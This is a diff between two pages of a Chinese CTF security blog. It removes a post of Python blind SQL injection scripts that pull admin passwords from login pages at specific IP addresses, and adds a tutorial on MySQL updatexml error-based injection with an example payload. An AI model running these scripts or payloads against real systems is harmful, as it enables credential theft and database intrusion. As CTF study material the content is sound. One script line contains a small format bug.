@@ -3,22 +3,19 @@
 <head>
   <meta charset="utf-8">
   
-  <title>blind_SQL_injection script | Err0r</title>
+  <title>updatexml mysql显错注入 | Err0r</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。">
+  <meta name="description" content="在学习之前，先了解一下updatexml用法:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="blind_SQL_injection script">
-<meta property="og:url" content="http://Err0rzz.github.io/2017/08/25/blind-SQL-injection-script/index.html">
+<meta property="og:title" content="updatexml mysql显错注入">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/index.html">
 <meta property="og:site_name" content="Err0r">
-<meta property="og:description" content="就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。">
+<meta property="og:description" content="在学习之前，先了解一下updatexml用法:">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/i1AJFAu.png">
-<meta property="og:image" content="https://i.imgur.com/pNMfXgg.png">
-<meta property="og:updated_time" content="2017-09-02T05:48:05.836Z">
+<meta property="og:updated_time" content="2017-10-31T08:57:28.497Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="blind_SQL_injection script">
-<meta name="twitter:description" content="就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。">
-<meta name="twitter:image" content="https://i.imgur.com/i1AJFAu.png">
+<meta name="twitter:title" content="updatexml mysql显错注入">
+<meta name="twitter:description" content="在学习之前，先了解一下updatexml用法:">
   
     <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
   
@@ -166,11 +163,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-blind-SQL-injection-script" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-updatexml-mysql显错注入" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/08/25/blind-SQL-injection-script/" class="article-date">
-      <time datetime="2017-08-25T11:22:58.000Z" itemprop="datePublished">2017-08-25</time>
+      <a href="/2017/10/31/updatexml-mysql显错注入/" class="article-date">
+      <time datetime="2017-10-31T06:51:09.000Z" itemprop="datePublished">2017-10-31</time>
 </a>
     </div>
   
@@ -183,7 +180,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      blind_SQL_injection script
+      updatexml mysql显错注入
     </h1>
   
 
@@ -200,18 +197,13 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。<br><a id="more"></a></p>
-<h1 id="简单的盲注脚本，根据错误信息判断"><a href="#简单的盲注脚本，根据错误信息判断" class="headerlink" title="简单的盲注脚本，根据错误信息判断"></a>简单的盲注脚本，根据错误信息判断</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">url = <span class="string">'http://58.154.33.13:8002/login.php'</span></div><div class="line"></div><div class="line">payloads=<span class="string">'1234567890qwertyuiopasdfghjklzxcvbnm_@'</span></div><div class="line"></div><div class="line"><span class="comment">#xx= "' or if(substring((select database()) from %s for 1)='%s',0,1) and '1'='1"</span></div><div class="line"><span class="comment">#xx = "' or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)='%s',0,1) and '1'='1"</span></div><div class="line"><span class="comment">#xx = "' or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin') from %s for 1)='%s',0,1) and '1'='1"</span></div><div class="line">xx = <span class="string">"' or if(substring((select password from admin) from %s for 1)='%s',0,1) and '1'='1"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:xx %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125; </div><div class="line">	<span class="comment">#print data</span></div><div class="line">	response = requests.post(url,data = data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span> response.content.find(<span class="string">'用户名错误'</span>)&gt;<span class="number">0</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line">ans=<span class="string">''</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">'star'</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payloads:</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span>:</div><div class="line">			ans+=x</div><div class="line">			<span class="keyword">print</span> ans</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure>
-<p><strong>如果改成基于时间的盲注的话，则只需将上方的exp改成如下</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	first_time=time.time()</div><div class="line">	xx=<span class="string">"' or if(substring((select database()) from %S for 1)='%s',sleep(5),0)"</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:xx %(i,x),<span class="string">'password'</span>:<span class="string">'123'</span>&#125; </div><div class="line">	<span class="comment">#print data</span></div><div class="line">	response = requests.post(url,data = data)</div><div class="line">	next_time=time.time()</div><div class="line">	<span class="keyword">if</span> (next_time-first_time) &gt; <span class="number">4</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure></p>
-<h1 id="布尔语句的盲注脚本"><a href="#布尔语句的盲注脚本" class="headerlink" title="布尔语句的盲注脚本"></a>布尔语句的盲注脚本</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">url = <span class="string">"http://218.76.35.74:20130/login.php"</span></div><div class="line">unameq = <span class="string">"admin'-(ascii(substr((select(group_concat(passwd))from(admin))from("</span></div><div class="line">password = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">128</span>):</div><div class="line">        uname = unameq+str(i)+<span class="string">")))="</span>+str(j)+<span class="string">")-'-1"</span></div><div class="line">        data = &#123;<span class="string">'uname'</span>:uname,<span class="string">'passwd'</span>:<span class="string">'123'</span>&#125;</div><div class="line">        r = requests.post(url=url, data=data)</div><div class="line">        <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> r.text:</div><div class="line">            password+=chr(j)</div><div class="line">            print(password)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> j==<span class="number">127</span>:</div><div class="line">            print(<span class="string">"完成!"</span>)</div><div class="line">            exit(<span class="number">0</span>)</div></pre></td></tr></table></figure>
-<p>条件：</p>
-<ol>
-<li>有<code>密码错误</code>或者<code>用户名错误</code>返回信息</li>
-<li>过滤了<strong>,,|,&amp;,and,or,union,like,*, (所有空白符)等</strong></li>
-</ol>
-<p>这里发现了mysql一个神奇的地方，就是字符串在进行运算的时候，会和php一样自动变成数字，比如’admin’-‘-1’的结果会是1,<img src="https://i.imgur.com/i1AJFAu.png" alt=""><img src="https://i.imgur.com/pNMfXgg.png" alt="">详情参考php，而且我还去试了下把username这一元素改成int类型，发现还是一样的结果</p>
-<p>猜测后台脚本应该是先判断用户名，再判断密码。所以上面这个脚本如果命中的话，<strong><code>查询结果会把所有不以数字开头的用户名都返回</code></strong>，然后返回密码错误。如果没命中的话，就会返回用户名错误</p>
-<p>以上就是一些没有过滤的时候的盲注脚本，以后会陆续添加有一些过滤的脚本</p>
+        <p>在学习之前，先了解一下updatexml用法:</p>
+<a id="more"></a>
+<p>updatexml(xml_document,xpath_string,new_value);<br>第一个参数:xml_documnet是String格式，为XML文档对象的名称，文中为Doc。<br>第二个参数:xpath_string(xpath格式的字符串),如果不了解xpath语法,可以在网上查找教程。<br>第三个参数:new_value,string格式,替换查找到的符合条件的数据。</p>
+<p>然后咋们再看看语句:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.XXXIII.com/a.php?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure></p>
+<p><code>concat(str1,str2,...)</code><br>返回结果为连接参数产生的字符串。如有任何一个参数为null，则返回值为null。</p>
+<p>通过查询@@version,返回版本。然后<code>concat</code>将其字符串化。因为<code>updatexml</code>第二个参数需要xpath格式的字符串,所以不符合要求，然后报错。</p>
+<p>错误大概会是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</div></pre></td></tr></table></figure></p>
 
       
       
@@ -267,13 +259,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></p>
+        <p><span>本文标题:</span><a href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
-        <p><span>发布时间:</span>2017年08月25日 - 19时22分</p>
-        <p><span>最后更新:</span>2017年09月02日 - 13时48分</p>
+        <p><span>发布时间:</span>2017年10月31日 - 14时51分</p>
+        <p><span>最后更新:</span>2017年10月31日 - 16时57分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/08/25/blind-SQL-injection-script/" title="blind_SQL_injection script">http://Err0rzz.github.io/2017/08/25/blind-SQL-injection-script/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/08/25/blind-SQL-injection-script/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/31/updatexml-mysql显错注入/" title="updatexml mysql显错注入">http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/10/31/updatexml-mysql显错注入/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -286,15 +278,11 @@
 
 <nav id="article-nav">
   
-    <a href="/2017/08/31/ZJGSCTF/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          ZJGSCTF
-        
-      </div>
-    </a>
   
+    <a href="/2017/10/26/typecho-backdoor/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">typecho backdoor</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
   
 </nav>
 
@@ -303,7 +291,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的盲注脚本，根据错误信息判断"><span class="toc-number">1.</span> <span class="toc-text">简单的盲注脚本，根据错误信息判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#布尔语句的盲注脚本"><span class="toc-number">2.</span> <span class="toc-text">布尔语句的盲注脚本</span></a></li></ol>
+    
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -369,13 +357,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/08/31/ZJGSCTF/" title="上一篇: ZJGSCTF">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2017/10/26/typecho-backdoor/" title="下一篇: typecho backdoor">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
     <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">updatexml mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
